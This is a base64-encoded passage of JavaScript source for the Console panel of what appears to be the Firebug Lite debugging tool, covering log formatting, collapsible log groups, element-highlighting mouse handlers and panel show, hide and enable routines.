QogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5sZW5ndGggPCAxKSB7IC8vIC4uLmFuZCBpdCBoYXMgbm8gY2hhcmFjdGVycy4NCiAgICAgICAgICAgICAgICAgICAgbG9nVGV4dCgiKGFuIGVtcHR5IHN0cmluZykiLCByb3cpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHBhcnRzID0gcGFyc2VGb3JtYXQoZm9ybWF0KTsNCiAgICAgICAgdmFyIHRyaWFsSW5kZXggPSBvYmpJbmRleDsNCiAgICAgICAgZm9yICh2YXIgaT0gMDsgaSA8IHBhcnRzLmxlbmd0aDsgaSsrKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcGFydCA9IHBhcnRzW2ldOw0KICAgICAgICAgICAgaWYgKHBhcnQgJiYgdHlwZW9mKHBhcnQpID09ICJvYmplY3QiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICgrK3RyaWFsSW5kZXggPiBvYmplY3RzLmxlbmd0aCkgIC8vIHRoZW4gdG9vIGZldyBwYXJhbWV0ZXJzIGZvciBmb3JtYXQsIGFzc3VtZSB1bmZvcm1hdHRlZC4NCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGZvcm1hdCA9ICIiOw0KICAgICAgICAgICAgICAgICAgICBvYmpJbmRleCA9IC0xOw0KICAgICAgICAgICAgICAgICAgICBwYXJ0cy5sZW5ndGggPSAwOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgfQ0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHBhcnRzLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcGFydCA9IHBhcnRzW2ldOw0KICAgICAgICAgICAgaWYgKHBhcnQgJiYgdHlwZW9mKHBhcnQpID09ICJvYmplY3QiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBvYmplY3QgPSBvYmplY3RzWysrb2JqSW5kZXhdOw0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2Yob2JqZWN0KSAhPSAidW5kZWZpbmVkIikNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5hcHBlbmRPYmplY3Qob2JqZWN0LCByb3csIHBhcnQucmVwKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHRoaXMuYXBwZW5kT2JqZWN0KHBhcnQudHlwZSwgcm93LCBGaXJlYnVnUmVwcy5UZXh0KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBGaXJlYnVnUmVwcy5UZXh0LnRhZy5hcHBlbmQoe29iamVjdDogcGFydH0sIHJvdyk7DQogICAgICAgIH0NCg0KICAgICAgICBmb3IgKHZhciBpID0gb2JqSW5kZXgrMTsgaSA8IG9iamVjdHMubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIGxvZ1RleHQoIiAiLCByb3cpOw0KICAgICAgICAgICAgdmFyIG9iamVjdCA9IG9iamVjdHNbaV07DQogICAgICAgICAgICBpZiAodHlwZW9mKG9iamVjdCkgPT0gInN0cmluZyIpDQogICAgICAgICAgICAgICAgRmlyZWJ1Z1JlcHMuVGV4dC50YWcuYXBwZW5kKHtvYmplY3Q6IG9iamVjdH0sIHJvdyk7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgdGhpcy5hcHBlbmRPYmplY3Qob2JqZWN0LCByb3cpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGFwcGVuZE9wZW5Hcm91cDogZnVuY3Rpb24ob2JqZWN0cywgcm93LCByZXApDQogICAgew0KICAgICAgICBpZiAoIXRoaXMuZ3JvdXBzKQ0KICAgICAgICAgICAgdGhpcy5ncm91cHMgPSBbXTsNCg0KICAgICAgICBzZXRDbGFzcyhyb3csICJsb2dHcm91cCIpOw0KICAgICAgICBzZXRDbGFzcyhyb3csICJvcGVuZWQiKTsNCg0KICAgICAgICB2YXIgaW5uZXJSb3cgPSB0aGlzLmNyZWF0ZVJvdygibG9nUm93Iik7DQogICAgICAgIHNldENsYXNzKGlubmVyUm93LCAibG9nR3JvdXBMYWJlbCIpOw0KICAgICAgICBpZiAocmVwKQ0KICAgICAgICAgICAgcmVwLnRhZy5yZXBsYWNlKHsib2JqZWN0cyI6IG9iamVjdHN9LCBpbm5lclJvdyk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRoaXMuYXBwZW5kRm9ybWF0dGVkKG9iamVjdHMsIGlubmVyUm93LCByZXApOw0KICAgICAgICByb3cuYXBwZW5kQ2hpbGQoaW5uZXJSb3cpOw0KICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkxvZ1Jvd0NyZWF0ZWQnLCBbdGhpcywgaW5uZXJSb3ddKTsNCiAgICAgICAgdmFyIGdyb3VwQm9keSA9IHRoaXMuY3JlYXRlUm93KCJsb2dHcm91cEJvZHkiKTsNCiAgICAgICAgcm93LmFwcGVuZENoaWxkKGdyb3VwQm9keSk7DQogICAgICAgIGdyb3VwQm9keS5zZXRBdHRyaWJ1dGUoJ3JvbGUnLCAnZ3JvdXAnKTsNCiAgICAgICAgdGhpcy5ncm91cHMucHVzaChncm91cEJvZHkpOw0KDQogICAgICAgIGFkZEV2ZW50KGlubmVyUm93LCAibW91c2Vkb3duIiwgZnVuY3Rpb24oZXZlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChpc0xlZnRDbGljayhldmVudCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy9jb25zb2xlLmxvZyhldmVudC5jdXJyZW50VGFyZ2V0ID09IGV2ZW50LnRhcmdldCk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRhcmdldCA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJsb2dHcm91cExhYmVsIik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIGdyb3VwUm93ID0gdGFyZ2V0LnBhcmVudE5vZGU7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKGhhc0NsYXNzKGdyb3VwUm93LCAib3BlbmVkIikpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZW1vdmVDbGFzcyhncm91cFJvdywgIm9wZW5lZCIpOw0KICAgICAgICAgICAgICAgICAgICB0YXJnZXQuc2V0QXR0cmlidXRlKCdhcmlhLWV4cGFuZGVkJywgJ2ZhbHNlJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHNldENsYXNzKGdyb3VwUm93LCAib3BlbmVkIik7DQogICAgICAgICAgICAgICAgICAgIHRhcmdldC5zZXRBdHRyaWJ1dGUoJ2FyaWEtZXhwYW5kZWQnLCAndHJ1ZScpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfSwNCg0KICAgIGFwcGVuZENsb3NlR3JvdXA6IGZ1bmN0aW9uKG9iamVjdCwgcm93LCByZXApDQogICAgew0KICAgICAgICBpZiAodGhpcy5ncm91cHMpDQogICAgICAgICAgICB0aGlzLmdyb3Vwcy5wb3AoKTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gVE9ETzogeHh4cGVkcm8gY29uc29sZTINCiAgICBvbk1vdXNlTW92ZTogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICBpZiAoIUZpcmVidWcuSW5zcGVjdG9yKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICB2YXIgdGFyZ2V0ID0gZXZlbnQuc3JjRWxlbWVudCB8fCBldmVudC50YXJnZXQ7DQogICAgICAgIA0KICAgICAgICB2YXIgb2JqZWN0ID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhcmdldCwgIm9iamVjdExpbmstZWxlbWVudCIpOw0KICAgICAgICBvYmplY3QgPSBvYmplY3QgPyBvYmplY3QucmVwT2JqZWN0IDogbnVsbDsNCiAgICAgICAgDQogICAgICAgIGlmKG9iamVjdCAmJiBpbnN0YW5jZU9mKG9iamVjdCwgIkVsZW1lbnQiKSAmJiBvYmplY3Qubm9kZVR5cGUgPT0gMSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYob2JqZWN0ICE9IGxhc3RIaWdobGlnaHRlZE9iamVjdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBGaXJlYnVnLkluc3BlY3Rvci5kcmF3Qm94TW9kZWwob2JqZWN0KTsNCiAgICAgICAgICAgICAgICBvYmplY3QgPSBsYXN0SGlnaGxpZ2h0ZWRPYmplY3Q7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgRmlyZWJ1Zy5JbnNwZWN0b3IuaGlkZUJveE1vZGVsKCk7DQogICAgICAgIA0KICAgIH0sDQogICAgDQogICAgb25Nb3VzZURvd246IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnNyY0VsZW1lbnQgfHwgZXZlbnQudGFyZ2V0Ow0KICAgICAgICANCiAgICAgICAgdmFyIG9iamVjdCA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJvYmplY3RMaW5rIik7DQogICAgICAgIHZhciByZXBPYmplY3QgPSBvYmplY3QgPyBvYmplY3QucmVwT2JqZWN0IDogbnVsbDsNCiAgICAgICAgDQogICAgICAgIGlmICghcmVwT2JqZWN0KQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmIChoYXNDbGFzcyhvYmplY3QsICJvYmplY3RMaW5rLW9iamVjdCIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5zZWxlY3RQYW5lbCgiRE9NIik7DQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5nZXRQYW5lbCgiRE9NIikuc2VsZWN0KHJlcE9iamVjdCwgdHJ1ZSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoaGFzQ2xhc3Mob2JqZWN0LCAib2JqZWN0TGluay1lbGVtZW50IikpDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdFBhbmVsKCJIVE1MIik7DQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5nZXRQYW5lbCgiSFRNTCIpLnNlbGVjdChyZXBPYmplY3QsIHRydWUpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAvKg0KICAgICAgICBpZihvYmplY3QgJiYgaW5zdGFuY2VPZihvYmplY3QsICJFbGVtZW50IikgJiYgb2JqZWN0Lm5vZGVUeXBlID09IDEpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmKG9iamVjdCAhPSBsYXN0SGlnaGxpZ2h0ZWRPYmplY3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5JbnNwZWN0b3IuZHJhd0JveE1vZGVsKG9iamVjdCk7DQogICAgICAgICAgICAgICAgb2JqZWN0ID0gbGFzdEhpZ2hsaWdodGVkT2JqZWN0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIEZpcmVidWcuSW5zcGVjdG9yLmhpZGVCb3hNb2RlbCgpOw0KICAgICAgICAvKiovDQogICAgICAgIA0KICAgIH0sDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gZXh0ZW5kcyBQYW5lbA0KDQogICAgbmFtZTogIkNvbnNvbGUiLA0KICAgIHRpdGxlOiAiQ29uc29sZSIsDQogICAgLy9zZWFyY2hhYmxlOiB0cnVlLA0KICAgIC8vYnJlYWthYmxlOiB0cnVlLA0KICAgIC8vZWRpdGFibGU6IGZhbHNlLA0KICAgIA0KICAgIG9wdGlvbnM6DQogICAgew0KICAgICAgICBoYXNDb21tYW5kTGluZTogdHJ1ZSwNCiAgICAgICAgaGFzVG9vbEJ1dHRvbnM6IHRydWUsDQogICAgICAgIGlzUHJlUmVuZGVyZWQ6IHRydWUNCiAgICB9LA0KICAgIA0KICAgIGNyZWF0ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5jcmVhdGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuY29udGV4dCA9IEZpcmVidWcuYnJvd3Nlci53aW5kb3c7DQogICAgICAgIHRoaXMuZG9jdW1lbnQgPSBGaXJlYnVnLmNocm9tZS5kb2N1bWVudDsNCiAgICAgICAgdGhpcy5vbk1vdXNlTW92ZSA9IGJpbmQodGhpcy5vbk1vdXNlTW92ZSwgdGhpcyk7DQogICAgICAgIHRoaXMub25Nb3VzZURvd24gPSBiaW5kKHRoaXMub25Nb3VzZURvd24sIHRoaXMpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5jbGVhckJ1dHRvbiA9IG5ldyBCdXR0b24oew0KICAgICAgICAgICAgZWxlbWVudDogJCgiZmJDb25zb2xlX2J0Q2xlYXIiKSwNCiAgICAgICAgICAgIG93bmVyOiBGaXJlYnVnLkNvbnNvbGUsDQogICAgICAgICAgICBvbkNsaWNrOiBGaXJlYnVnLkNvbnNvbGUuY2xlYXINCiAgICAgICAgfSk7DQogICAgfSwNCg0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIEZpcmVidWcuUGFuZWwuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOyAgLy8gbG9hZHMgcGVyc2lzdGVkIGNvbnRlbnQNCiAgICAgICAgLy9GaXJlYnVnLkFjdGl2YWJsZVBhbmVsLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsgIC8vIGxvYWRzIHBlcnNpc3RlZCBjb250ZW50DQoNCiAgICAgICAgaWYgKCF0aGlzLnBlcnNpc3RlZENvbnRlbnQgJiYgRmlyZWJ1Zy5Db25zb2xlLmlzQWx3YXlzRW5hYmxlZCgpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmluc2VydExvZ0xpbWl0KHRoaXMuY29udGV4dCk7DQoNCiAgICAgICAgICAgIC8vIEluaXRpYWxpemUgbG9nIGxpbWl0IGFuZCBsaXN0ZW4gZm9yIGNoYW5nZXMuDQogICAgICAgICAgICB0aGlzLnVwZGF0ZU1heExpbWl0KCk7DQoNCiAgICAgICAgICAgIGlmICh0aGlzLmNvbnRleHQuY29uc29sZVJlbG9hZFdhcm5pbmcpICAvLyB3ZSBoYXZlIG5vdCB5ZXQgaW5qZWN0ZWQgdGhlIGNvbnNvbGUNCiAgICAgICAgICAgICAgICB0aGlzLmluc2VydFJlbG9hZFdhcm5pbmcoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLmluamVjdG9yLmluc3RhbGwoRmlyZWJ1Zy5icm93c2VyLndpbmRvdyk7DQogICAgICAgIA0KICAgICAgICBhZGRFdmVudCh0aGlzLnBhbmVsTm9kZSwgIm1vdXNlb3ZlciIsIHRoaXMub25Nb3VzZU1vdmUpOw0KICAgICAgICBhZGRFdmVudCh0aGlzLnBhbmVsTm9kZSwgIm1vdXNlZG93biIsIHRoaXMub25Nb3VzZURvd24pOw0KICAgICAgICANCiAgICAgICAgdGhpcy5jbGVhckJ1dHRvbi5pbml0aWFsaXplKCk7DQogICAgICAgIA0KICAgICAgICAvL2NvbnNvbGV4LnRyYWNlKCk7DQogICAgICAgIC8vVE9ETzogeHh4cGVkcm8gcmVtb3ZlIHRoaXMgDQogICAgICAgIC8qDQogICAgICAgIEZpcmVidWcuQ29uc29sZS5vcGVuR3JvdXAoWyJhc2QiXSwgbnVsbCwgImdyb3VwIiwgbnVsbCwgZmFsc2UpOw0KICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nKCJhc2QiKTsNCiAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmxvZygiYXNkIik7DQogICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2coImFzZCIpOw0KICAgICAgICAvKiovDQogICAgICAgIA0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvIHByZWZlcmVuY2VzIHByZWZzDQogICAgICAgIC8vcHJlZnMuYWRkT2JzZXJ2ZXIoRmlyZWJ1Zy5wcmVmRG9tYWluLCB0aGlzLCBmYWxzZSk7DQogICAgfSwNCg0KICAgIGluaXRpYWxpemVOb2RlIDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25Jbml0aWFsaXplTm9kZScsIFt0aGlzXSk7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLm9uU2Nyb2xsZXIgPSBiaW5kKHRoaXMub25TY3JvbGwsIHRoaXMpOw0KICAgICAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICJzY3JvbGwiLCB0aGlzLm9uU2Nyb2xsZXIpOw0KICAgICAgICB9DQoNCiAgICAgICAgdGhpcy5vblJlc2l6ZXIgPSBiaW5kKHRoaXMub25SZXNpemUsIHRoaXMpOw0KICAgICAgICB0aGlzLnJlc2l6ZUV2ZW50VGFyZ2V0ID0gRmlyZWJ1Zy5jaHJvbWUuJCgnZmJDb250ZW50Qm94Jyk7DQogICAgICAgIGFkZEV2ZW50KHRoaXMucmVzaXplRXZlbnRUYXJnZXQsICJyZXNpemUiLCB0aGlzLm9uUmVzaXplcik7DQogICAgfSwNCg0KICAgIGRlc3Ryb3lOb2RlIDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25EZXN0cm95Tm9kZScsIFt0aGlzXSk7DQogICAgICAgIGlmICh0aGlzLm9uU2Nyb2xsZXIpDQogICAgICAgICAgICByZW1vdmVFdmVudCh0aGlzLnBhbmVsTm9kZSwgInNjcm9sbCIsIHRoaXMub25TY3JvbGxlcik7DQoNCiAgICAgICAgLy9yZW1vdmVFdmVudCh0aGlzLnJlc2l6ZUV2ZW50VGFyZ2V0LCAicmVzaXplIiwgdGhpcy5vblJlc2l6ZXIpOw0KICAgIH0sDQoNCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybyBjb25zb2xlIGNvbnNvbGUyDQogICAgICAgIHRoaXMuY2xlYXJCdXR0b24uc2h1dGRvd24oKTsNCiAgICAgICAgDQogICAgICAgIHJlbW92ZUV2ZW50KHRoaXMucGFuZWxOb2RlLCAibW91c2Vtb3ZlIiwgdGhpcy5vbk1vdXNlTW92ZSk7DQogICAgICAgIHJlbW92ZUV2ZW50KHRoaXMucGFuZWxOb2RlLCAibW91c2Vkb3duIiwgdGhpcy5vbk1vdXNlRG93bik7DQogICAgICAgIA0KICAgICAgICB0aGlzLmRlc3Ryb3lOb2RlKCk7DQoNCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybyBwcmVmZXJlbmNlcyBwcmVmcw0KICAgICAgICAvL3ByZWZzLnJlbW92ZU9ic2VydmVyKEZpcmVidWcucHJlZkRvbWFpbiwgdGhpcywgZmFsc2UpOw0KICAgIH0sDQoNCiAgICBpc2hvdzogZnVuY3Rpb24oc3RhdGUpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJDb25zb2xlLnBhbmVsIHNob3c7ICIgKyB0aGlzLmNvbnRleHQuZ2V0TmFtZSgpLCBzdGF0ZSk7DQoNCiAgICAgICAgdmFyIGVuYWJsZWQgPSBGaXJlYnVnLkNvbnNvbGUuaXNBbHdheXNFbmFibGVkKCk7DQogICAgICAgIGlmIChlbmFibGVkKQ0KICAgICAgICB7DQogICAgICAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmRpc2FibGVkUGFuZWxQYWdlLmhpZGUodGhpcyk7DQogICAgICAgICAgICAgdGhpcy5zaG93Q29tbWFuZExpbmUodHJ1ZSk7DQogICAgICAgICAgICAgdGhpcy5zaG93VG9vbGJhckJ1dHRvbnMoImZiQ29uc29sZUJ1dHRvbnMiLCB0cnVlKTsNCiAgICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5zZXRHbG9iYWxBdHRyaWJ1dGUoImNtZF90b2dnbGVQZXJzaXN0Q29uc29sZSIsICJjaGVja2VkIiwgdGhpcy5wZXJzaXN0Q29udGVudCk7DQoNCiAgICAgICAgICAgICBpZiAoc3RhdGUgJiYgc3RhdGUud2FzU2Nyb2xsZWRUb0JvdHRvbSkNCiAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgIHRoaXMud2FzU2Nyb2xsZWRUb0JvdHRvbSA9IHN0YXRlLndhc1Njcm9sbGVkVG9Cb3R0b207DQogICAgICAgICAgICAgICAgIGRlbGV0ZSBzdGF0ZS53YXNTY3JvbGxlZFRvQm90dG9tOw0KICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgIGlmICh0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20pDQogICAgICAgICAgICAgICAgIHNjcm9sbFRvQm90dG9tKHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZS5zaG93IC0tLS0tLS0tLS0tLS0tLS0tLSB3YXNTY3JvbGxlZFRvQm90dG9tOiAiICsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy53YXNTY3JvbGxlZFRvQm90dG9tICsgIiwgIiArIHRoaXMuY29udGV4dC5nZXROYW1lKCkpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5oaWRlKHN0YXRlKTsNCiAgICAgICAgICAgIEZpcmVidWcuQ29uc29sZS5kaXNhYmxlZFBhbmVsUGFnZS5zaG93KHRoaXMpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGloaWRlOiBmdW5jdGlvbihzdGF0ZSkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoIkNvbnNvbGUucGFuZWwgaGlkZTsgIiArIHRoaXMuY29udGV4dC5nZXROYW1lKCksIHN0YXRlKTsNCg0KICAgICAgICB0aGlzLnNob3dUb29sYmFyQnV0dG9ucygiZmJDb25zb2xlQnV0dG9ucyIsIGZhbHNlKTsNCiAgICAgICAgdGhpcy5zaG93Q29tbWFuZExpbmUoZmFsc2UpOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNvbnNvbGUuaGlkZSAtLS0tLS0tLS0tLS0tLS0tLS0gd2FzU2Nyb2xsZWRUb0JvdHRvbTogIiArDQogICAgICAgICAgICAgICAgdGhpcy53YXNTY3JvbGxlZFRvQm90dG9tICsgIiwgIiArIHRoaXMuY29udGV4dC5nZXROYW1lKCkpOw0KICAgIH0sDQoNCiAgICBkZXN0cm95OiBmdW5jdGlvbihzdGF0ZSkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLnBhbmVsTm9kZS5vZmZzZXRIZWlnaHQpDQogICAgICAgICAgICB0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20gPSBpc1Njcm9sbGVkVG9Cb3R0b20odGhpcy5wYW5lbE5vZGUpOw0KDQogICAgICAgIGlmIChzdGF0ZSkNCiAgICAgICAgICAgIHN0YXRlLndhc1Njcm9sbGVkVG9Cb3R0b20gPSB0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b207DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZS5kZXN0cm95IC0tLS0tLS0tLS0tLS0tLS0tLSB3YXNTY3JvbGxlZFRvQm90dG9tOiAiICsNCiAgICAgICAgICAgICAgICB0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20gKyAiLCAiICsgdGhpcy5jb250ZXh0LmdldE5hbWUoKSk7DQogICAgfSwNCg0KICAgIHNob3VsZEJyZWFrT25OZXh0OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvLyB4eHhIb256YTogc2hvdWxkbid0IHRoZSBicmVha09uRXJyb3JzIGJlIGNvbnRleHQgcmVsYXRlZD8NCiAgICAgICAgLy8geHh4SkpCLCB5ZXMsIGJ1dCB3ZSBjYW4ndCBzdXBwb3J0IGl0IGJlY2F1c2Ugd2UgY2FuJ3QgeWV0IHRlbGwNCiAgICAgICAgLy8gd2hpY2ggd2luZG93IHRoZSBlcnJvciBpcyBvbi4NCiAgICAgICAgcmV0dXJuIEZpcmVidWcuZ2V0UHJlZihGaXJlYnVnLnNlcnZpY2VQcmVmRG9tYWluLCAiYnJlYWtPbkVycm9ycyIpOw0KICAgIH0sDQoNCiAgICBnZXRCcmVha09uTmV4dFRvb2x0aXA6IGZ1bmN0aW9uKGVuYWJsZWQpDQogICAgew0KICAgICAgICByZXR1cm4gKGVuYWJsZWQgPyAkU1RSKCJjb25zb2xlLkRpc2FibGUgQnJlYWsgT24gQWxsIEVycm9ycyIpIDoNCiAgICAgICAgICAgICRTVFIoImNvbnNvbGUuQnJlYWsgT24gQWxsIEVycm9ycyIpKTsNCiAgICB9LA0KDQogICAgZW5hYmxlUGFuZWw6IGZ1bmN0aW9uKG1vZHVsZSkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNvbnNvbGUuQ29uc29sZVBhbmVsLmVuYWJsZVBhbmVsOyAiICsgdGhpcy5jb250ZXh0LmdldE5hbWUoKSk7DQoNCiAgICAgICAgRmlyZWJ1Zy5BY3RpdmFibGVQYW5lbC5lbmFibGVQYW5lbC5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KDQogICAgICAgIHRoaXMuc2hvd0NvbW1hbmRMaW5lKHRydWUpOw0KDQogICAgICAgIGlmICh0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20pDQogICAgICAgICAgICBzY3JvbGxUb0JvdHRvbSh0aGlzLnBhbmVsTm9kZSk7DQogICAgfSwNCg0KICAgIGRpc2FibGVQYW5lbDogZnVuY3Rpb24obW9kdWxlKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZS5Db25zb2xlUGFuZWwuZGlzYWJsZVBhbmVsOyAiICsgdGhpcy5jb250ZXh0LmdldE5hbWUoKSk7DQoNCiAgICAgICAgRmlyZWJ1Zy5BY3RpdmFibGVQYW5lbC5kaXNhYmxlUGFuZWwuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCg0KICAgICAgICB0aGlzLnNob3dDb21tYW5kTGluZShmYWxzZSk7DQogICAgfSwNCg0KICAgIGdldE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uK